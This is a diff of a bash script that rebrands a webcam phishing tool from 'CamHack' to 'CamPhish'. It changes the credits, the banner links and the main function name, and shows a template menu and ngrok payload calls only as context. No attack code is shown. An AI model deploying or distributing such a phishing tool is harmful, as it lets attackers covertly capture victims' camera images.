@@ -1,6 +1,6 @@
 #!/bin/bash
-# CamHack v2.0
-# Powered by Technical Vivek Pathak 
+# CamPhish v1.0
+# Powered by TechChip
 # Credits goes to thelinuxchoice [github.com/thelinuxchoice/]
 
 trap 'printf "\n";stop' 2
@@ -16,7 +16,7 @@ printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | 
 printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n\n"
 
-printf " \e[1;77m https://technicalvivekpathak.blogspot.com/?m=1 | youtube.com/technicalvivekpathak \e[0m \n"
+printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
 
 printf "\n"
 
@@ -141,7 +141,7 @@ printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
 sleep 1
 clear
 banner
-camhack
+camphish
 else
 printf "\n-----Choose a template----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
@@ -212,7 +212,7 @@ payload_ngrok
 checkfound
 }
 
-() {
+camphish() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
@@ -235,7 +235,7 @@ else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
 clear
-camhack
+camphish
 fi
 
 }
@@ -279,5 +279,5 @@ checkfound
 
 banner
 dependencies
-camhack
+camphish
 
